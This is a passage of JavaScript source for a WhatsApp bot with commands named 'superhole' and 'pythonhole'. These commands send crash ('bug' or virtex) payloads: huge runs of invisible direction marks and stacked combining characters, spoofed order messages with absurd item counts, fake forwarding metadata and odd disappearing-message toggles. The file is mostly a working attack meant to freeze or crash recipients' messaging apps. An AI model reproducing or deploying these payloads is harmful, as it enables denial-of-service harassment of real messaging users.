‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎Virgam!!★‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏
`
zoe.sendMessage(from, wew, image, {thumbnail:fs.readFileSync(`hm/vvirgamv2.jpeg`),quoted: {key:{fromMe:false,participant:`0@s.whatsapp.net`, ...(from ? {remoteJid :"6289523258649-1604595598@g.us" }: {})},message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`hm/vvirgamv2.jpeg`),"itemCount":999999999,"status":"INQUIRY","surface":"CATALOG","message":` BODY `,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}},caption: lzain,contextInfo: {"mentionedJid": [sender], "forwardingScore":999,"isForwarded":true}})
break		
case 'superhole':
await zoe.toggleDisappearingMessages(from)
zoe.sendMessage(from, bughole(prefix), text)
break
case 'pythonhole':
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.sendMessage(from, bughole(prefix), text)
zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
        listMsg = {
 buttonText: 'PYTHON HOLE',
 footerText: `${emoji2(prefix)}`,
 description: `${virtex2(prefix)}`,
 sections: [
                     {
                      "title": "Cie",
 rows: [
                          {
                              "title": "CieBug",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
zoe.sendMessage(from, listMsg, MessageType.listMessage, {quoted:dev})
        zoe.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
zoe.toggleDisappearingMessages(from, 'wokwok')
zoe.sendMessage(from, `ஓঔ🛡⇝͜͡✪𝕷𝖔𝖗𝖉\x20𝕬𝖗𝖎𝖋𝖎🦅\x20͜͡✪*\x0a*~*.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.*999**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭999999**ผิดุท้่เึางืผิดุท้่เึางื**9999999**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭৭৭৭৭৭*MythicXbot*๒๒๒๒๒๒๒๒*MythicXbot*৭৭৭৭৭৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠